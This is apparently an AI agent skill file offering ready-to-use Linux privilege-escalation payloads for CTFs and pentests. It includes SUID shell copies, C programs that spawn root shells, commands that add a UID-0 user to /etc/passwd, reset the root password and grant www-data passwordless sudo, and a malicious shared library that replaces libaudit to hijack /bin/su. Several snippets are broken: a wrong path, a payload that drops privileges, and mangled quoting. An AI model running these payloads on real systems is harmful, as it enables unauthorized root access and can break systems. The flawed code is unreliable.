---
name: linux-privilege-escalation
description: Linux privilege escalation payloads and techniques for CTFs and authorized penetration testing. Use this skill whenever the user mentions privilege escalation, privesc, SUID binaries, setuid, escalating from www-data to root, overwriting libraries, or any Linux security testing scenario. This includes CTF challenges, authorized pentests, and security research.
---

# Linux Privilege Escalation Payloads

**⚠️ IMPORTANT: Only use these techniques on systems you own or have explicit written authorization to test. Unauthorized access is illegal.**

This skill provides ready-to-use payloads and techniques for Linux privilege escalation in CTFs and authorized penetration testing scenarios.

## Quick Reference

| Technique | When to Use | Complexity |
|-----------|-------------|------------|
| SUID Bash | You can write to /tmp | Easy |
| C Payloads | You can compile code | Medium |
| Library Overwrite | You can overwrite shared libs | Hard |
| Sudoers Edit | You can write to /etc/sudoers | Easy |
| Password File Edit | You can write to /etc/passwd | Easy |

---

## SUID Binary Technique

Create a SUID (Set User ID) binary that maintains elevated privileges when executed.

### Bash SUID

```bash
# Copy bash to /tmp and set SUID bit
cp /bin/bash /tmp/b && chmod +s /tmp/b

# Execute to maintain root privileges
/bin/b -p
```

**Works on:** Debian, Ubuntu
**Requirements:** Write access to /tmp, ability to chmod +s

---

## C Payloads

### Basic SUID Payload

```c
// Compile: gcc payload.c -o payload
// Then: chmod +s payload

int main(void){
    setresuid(0, 0, 0); // Set as SUID user
    system("/bin/sh");
    return 0;
}
```

### UID Preservation Payload

```c
// Compile: gcc payload.c -o payload
// Then: chmod +s payload

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setuid(getuid());
    system("/bin/bash");
    return 0;
}
```

### Targeted User ID Escalation

```c
// Escalate to specific user ID (e.g., 1000)
// Compile: gcc payload.c -o payload
// Then: chmod +s payload

#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    const int id = 1000;  // Change to target UID
    setresuid(id, id, id);
    execve(paramList[0], paramList, NULL);
    return 0;
}
```

---

## File Overwriting Techniques

### Common Target Files

| File | Purpose | Risk Level |
|------|---------|------------|
| `/etc/passwd` | Add new user | High |
| `/etc/shadow` | Change passwords | High |
| `/etc/sudoers` | Grant sudo access | High |
| `/run/docker.sock` | Docker abuse | Medium |

### Add User to /etc/passwd

```bash
# Add hacker user with root privileges (UID 0)
echo 'hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash' >> /etc/passwd
```

### Change Root Password

```bash
echo "root:hacked" | chpasswd
```

### Modify Sudoers (www-data to root)

```bash
# Create script to modify sudoers
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update

# Execute when root runs it
```

---

## Shared Library Overwrite

### Step 1: Identify Target Library

```bash
# Check libraries used by a SUID binary
ldd /bin/su
```

Example output:
```
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

### Step 2: Find Required Symbols

```bash
# Check which symbols from the library are used by the binary
objdump -T /bin/su | grep audit
```

Example output:
```
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
00000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```

### Step 3: Create Malicious Library

```c
// Compile: gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

// Declare required symbols (must match what the binary expects)
int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

// Constructor runs when library is loaded
void inject()__attribute__((constructor));

void inject()
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

### Step 4: Execute

```bash
# After overwriting the library, run the target binary
/bin/su
# You should now get a root shell
```

---

## Workflow Guide

### 1. Reconnaissance

```bash
# Check current user
whoami
id

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Check for writable files
find /etc -writable 2>/dev/null
```

### 2. Choose Technique

- **Can write to /tmp?** → Use SUID Bash
- **Can compile C code?** → Use C payloads
- **Can overwrite libraries?** → Use library injection
- **Can edit /etc/sudoers?** → Modify sudoers
- **Can edit /etc/passwd?** → Add user

### 3. Execute and Verify

```bash
# After running payload, verify escalation
whoami
id
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| `Permission denied` on chmod +s | Need root or SUID capability |
| Library not found | Check symbol names with `objdump -T` |
| Shell doesn't maintain privileges | Use `-p` flag with bash |
| SELinux blocking | Check `getenforce`, may need to disable |

---

## Notes

- Always test on your own systems or authorized targets
- Some techniques may be detected by security software
- Library overwrites can break system functionality
- Keep backups of modified files for cleanup
- Document your findings for reporting

---

## References

- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
